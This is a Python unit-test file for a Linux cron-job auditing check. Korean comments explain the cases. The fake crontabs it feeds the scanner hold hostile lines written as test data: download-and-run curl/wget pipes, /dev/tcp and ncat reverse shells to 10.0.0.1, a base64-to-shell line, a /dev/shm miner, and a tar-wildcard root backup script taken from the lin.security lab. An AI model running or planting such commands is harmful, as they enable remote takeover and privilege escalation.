import os
import unittest

from lintrace.checks.base import Context, Unavailable
from lintrace.checks.per_01 import Per01, exec_paths, hidden_system_path, wildcard_hits

from helpers import FakeRootTest, files_owned_by_root

NOW = 1793600000.0

# lin.security의 /etc/crontab 그대로 (15행이 매분 backup 실행)
LINSEC_CRONTAB = """\
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user\tcommand
17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly
25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *   root    /etc/cron.daily/backup
#
"""
LINSEC_BACKUP = """\
#!/bin/bash
for i in $(ls /home); do cd /home/$i && /bin/tar -zcf /etc/backups/home-$i.tgz *; done
"""
MDADM = """\
#
# cron.d/mdadm -- schedules periodic redundancy checks of MD devices
#
57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
"""
POPCON = """\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
2 8 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
"""
# Ubuntu 기본 cron.daily 스크립트 중 오탐이 나기 쉬운 형태 (cd, 반복문, 변수)
UBUNTU_PASSWD = """\
#!/bin/sh
cd /var/backups || exit 0
for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE    && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
"""
UBUNTU_LOGROTATE = """\
#!/bin/sh
if [ -d /run/systemd/system ]; then
    exit 0
fi
/usr/sbin/logrotate /etc/logrotate.conf
EXITVALUE=$?
if [ $EXITVALUE != 0 ]; then
    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
fi
exit $EXITVALUE
"""
PASSWD = ("root:x:0:0:root:/root:/bin/bash\n"
          "bob:x:1000:1000::/home/bob:/bin/bash\n"
          "insecurity:<hash>:0:0::/:/bin/sh\n")


class TestHelpers(unittest.TestCase):
    def test_exec_paths(self):
        self.assertEqual(exec_paths("cd / && run-parts --report /etc/cron.daily"), ["cd", "run-parts"])
        self.assertEqual(exec_paths("test -x /a && /a --crond"), ["test", "/a"])
        self.assertEqual(exec_paths("FOO=1 nice -n 5 /usr/bin/job"), ["/usr/bin/job"])
        self.assertEqual(exec_paths("timeout 30 bash /opt/x.sh"), ["/opt/x.sh"])
        self.assertEqual(exec_paths("python3 -c 'print(1)'"), [])
        self.assertEqual(exec_paths("sh -c '/tmp/x; echo done'"), ["/tmp/x", "echo"])
        self.assertEqual(exec_paths("echo 'a; /tmp/y'"), ["echo"])  # 따옴표 안은 실행되지 않음
        self.assertIn("/usr/share/mdadm/checkarray",
                      exec_paths("if [ -x /x ] && [ $(date +\\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron; fi"))

    def test_hidden_system_path(self):
        self.assertTrue(hidden_system_path("/usr/lib/.cache/upd"))
        self.assertTrue(hidden_system_path("/var/.../x"))
        self.assertFalse(hidden_system_path("/root/.acme.sh/acme.sh"))   # 흔한 정상 사용
        self.assertFalse(hidden_system_path("/home/bob/.local/bin/x"))
        self.assertFalse(hidden_system_path("./run"))

    def test_wildcard_hits(self):
        self.assertEqual(wildcard_hits("cd /home/$i && /bin/tar -zcf /b/h.tgz *", None),
                         [("tar", "*", "/home/$i")])
        self.assertEqual(wildcard_hits("tar czf x.tgz --exclude=*.log /srv", None), [])
        self.assertEqual(wildcard_hits("tar czf x.tgz '*'", None), [])
        self.assertEqual(wildcard_hits("rsync -a /tmp/* /backup/", None), [("rsync", "/tmp/*", "/tmp/*")])
        self.assertEqual(wildcard_hits("cp /x/file.tar.gz /y/*", None), [])


class TestPer01(FakeRootTest):
    def scan(self, files, modes=None):
        root = self.make_root(dict({"/etc/passwd": PASSWD, "/var/spool/cron/crontabs": None}, **files))
        for path in files:
            full = os.path.join(root, path.lstrip("/"))
            if os.path.isfile(full):
                os.utime(full, (NOW - 86400, NOW - 86400))
        for path, mode in (modes or {}).items():
            os.chmod(os.path.join(root, path.lstrip("/")), mode)
        check = Per01()
        return check, check.run(Context(root, now=NOW))

    @files_owned_by_root
    def test_linsecurity(self):
        check, f = self.scan({
            "/etc/crontab": LINSEC_CRONTAB,
            "/etc/cron.d/mdadm": MDADM,
            "/etc/cron.d/popularity-contest": POPCON,
            "/etc/cron.d/.placeholder": "# DO NOT EDIT OR REMOVE\n* * * * * root curl x | sh\n",
            "/etc/cron.daily/backup": LINSEC_BACKUP,
            "/etc/cron.daily/passwd": UBUNTU_PASSWD,
            "/etc/cron.daily/logrotate": UBUNTU_LOGROTATE,
            "/etc/cron.daily/.placeholder": "# DO NOT EDIT OR REMOVE\n",
            "/etc/cron.hourly/.placeholder": "# DO NOT EDIT OR REMOVE\n",
        }, modes={"/etc/cron.daily/backup": 0o755, "/etc/cron.daily/passwd": 0o755,
                  "/etc/cron.daily/logrotate": 0o755, "/etc/cron.daily": 0o755})
        self.assertEqual(len(f), 1, [x.reason for x in f])
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("root가 실행하는 스크립트 /etc/cron.daily/backup", f[0].reason)
        self.assertIn("tar 인자 '*'가 사용자가 쓸 수 있는 폴더(/home/$i)에서 풀린다", f[0].reason)
        details = [e.detail for e in f[0].evidence]
        self.assertTrue(details[0].startswith("2행: for i in $(ls /home)"))
        runners = [d for d in details if "실행하는 곳" in d]
        self.assertEqual(len(runners), 2)  # 매분 실행(15행) + run-parts cron.daily(12행)
        self.assertTrue(any(d.startswith("15행") for d in runners))
        self.assertTrue(any(d.startswith("12행") for d in runners))
        self.assertIn("--checkpoint-action", f[0].next_steps)
        self.assertEqual(check.scope, "예약 작업 7개, root가 실행하는 스크립트 3개")

    def test_download_exec_in_user_crontab(self):
        _, f = self.scan({"/var/spool/cron/crontabs/bob": "*/5 * * * * curl -s http://10.0.0.5/a.sh | bash\n"})
        crit = [x for x in f if x.severity == "critical"]
        self.assertEqual(len(crit), 1)
        self.assertIn("'bob' 권한으로 실행되는 예약 작업: 내려받아 바로 실행한다", crit[0].reason)
        info = [x for x in f if x.severity == "info"]
        self.assertEqual(len(info), 1)
        self.assertIn("'bob' 계정의 crontab에 예약 작업 1개", info[0].reason)

    def test_reverse_shell_and_base64(self):
        _, f = self.scan({"/etc/cron.d/x": "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
                                           "@reboot root echo aGk= | base64 -d | sh\n"
                                           "0 * * * * root ncat 10.0.0.1 4444 --sh-exec /bin/bash\n"})
        self.assertEqual([x.severity for x in f], ["critical"] * 3)
        self.assertIn("리버스 셸", f[0].reason)
        self.assertIn("base64", f[1].reason)
        self.assertNotIn("@reboot", f[1].reason)  # 더 강한 조건이 있으면 @reboot 참고는 붙이지 않음
        self.assertIn("리버스 셸", f[2].reason)

    def test_temp_dir_exec(self):
        _, f = self.scan({"/etc/cron.d/x": "* * * * * root /tmp/.x/run\n"
                                           "* * * * * root cd /dev/shm && ./miner -o pool\n"
                                           "* * * * * root rm -f /tmp/old.log\n"})
        self.assertEqual(len(f), 2)
        self.assertIn("/tmp/.x/run", f[0].reason)
        self.assertNotIn("숨김", f[0].reason)  # 임시 폴더로 이미 심각이면 숨김 경로는 중복 표시 안 함
        self.assertIn("/dev/shm/miner", f[1].reason)

    def test_reboot_alone_is_info(self):
        _, f = self.scan({"/etc/cron.d/x": "@reboot root /usr/local/bin/startup\n"})
        self.assertEqual(f[0].severity, "info")
        self.assertIn("@reboot", f[0].reason)

    def test_hidden_path(self):
        _, f = self.scan({"/etc/cron.d/x": "0 * * * * root /usr/lib/.cache/upd\n"
                                           "0 0 * * * root /root/.acme.sh/acme.sh --cron\n"})
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "warning")

    def test_wildcards(self):
        _, f = self.scan({"/etc/cron.d/x": "0 1 * * * root tar czf /backup/etc.tgz /etc/*\n"
                                           "0 2 * * * root rsync -a /tmp/* /backup/\n"
                                           "0 3 * * * root tar czf /b.tgz --exclude=*.log /srv\n",
                          "/var/spool/cron/crontabs/bob": "0 4 * * * cd ~ && tar czf b.tgz *\n"})
        sev = {x.evidence[0].detail.split("행")[0]: x.severity for x in f if x.evidence[0].source == "/etc/cron.d/x"}
        self.assertEqual(sev, {"1": "warning", "2": "critical"})
        bob = [x for x in f if "bob" in x.reason]
        self.assertEqual([x.severity for x in bob], ["info"])  # 본인 계정의 tar는 권한 상승이 아님

    @files_owned_by_root
    def test_cd_on_earlier_script_line(self):
        _, f = self.scan({"/etc/crontab": "0 1 * * * root /opt/bk.sh\n",
                          "/opt/bk.sh": "#!/bin/sh\ncd /home/bob\ntar czf /var/b.tgz *\n"},
                         modes={"/opt/bk.sh": 0o755})
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("(/home/bob)", f[0].reason)

    def test_writable_files_run_by_root(self):
        _, f = self.scan({"/etc/crontab": "0 1 * * * root /usr/local/bin/job\n0 2 * * * root /opt/s.sh\n",
                          "/usr/local/bin/job": "\x7fELF",
                          "/opt/s.sh": "#!/bin/sh\necho ok\n"},
                         modes={"/usr/local/bin/job": 0o777, "/opt/s.sh": 0o666, "/opt": 0o755})
        self.assertEqual(len(f), 2, [x.reason for x in f])  # 스크립트 경고가 두 번 나오지 않아야 함
        self.assertTrue(all(x.severity == "warning" for x in f))
        self.assertIn("/usr/local/bin/job를 다른 사용자가 바꿀 수 있다 (권한 777", f[0].reason)
        self.assertIn("root가 실행하는 스크립트 /opt/s.sh", f[1].reason)

    @files_owned_by_root
    def test_run_parts_naming_and_exec_bit(self):
        _, f = self.scan({"/etc/cron.daily/evil.sh": "#!/bin/sh\ncurl x | sh\n",   # '.' 들어간 이름은 실행 안 됨
                          "/etc/cron.daily/noexec": "#!/bin/sh\ncurl x | sh\n",    # 실행 권한 없음
                          "/etc/cron.daily/bin": "\x7fELF /dev/tcp/ inside binary"},  # 바이너리는 읽지 않음
                         modes={"/etc/cron.daily/evil.sh": 0o755, "/etc/cron.daily/noexec": 0o644,
                                "/etc/cron.daily/bin": 0o755})
        self.assertEqual(f, [])

    @files_owned_by_root
    def test_run_parts_script_is_scanned_without_crontab(self):
        _, f = self.scan({"/etc/cron.daily/upd": "#!/bin/sh\nwget -qO- http://x/i | sh\n"},
                         modes={"/etc/cron.daily/upd": 0o755})
        self.assertEqual(f[0].severity, "critical")
        self.assertIn("run-parts 표준 대상 폴더", [e.detail for e in f[0].evidence])

    def test_unreadable_spool_is_unavailable(self):
        if os.geteuid() == 0:
            self.skipTest("root는 권한과 관계없이 읽을 수 있어 일반 계정에서만 확인 가능")
        root = self.make_root({"/etc/passwd": PASSWD, "/var/spool/cron/crontabs/bob": "* * * * * true\n"})
        os.chmod(os.path.join(root, "var/spool/cron/crontabs"), 0o300)
        self.addCleanup(os.chmod, os.path.join(root, "var/spool/cron/crontabs"), 0o755)
        with self.assertRaises(Unavailable):
            Per01().run(Context(root, now=NOW))


if __name__ == "__main__":
    unittest.main()
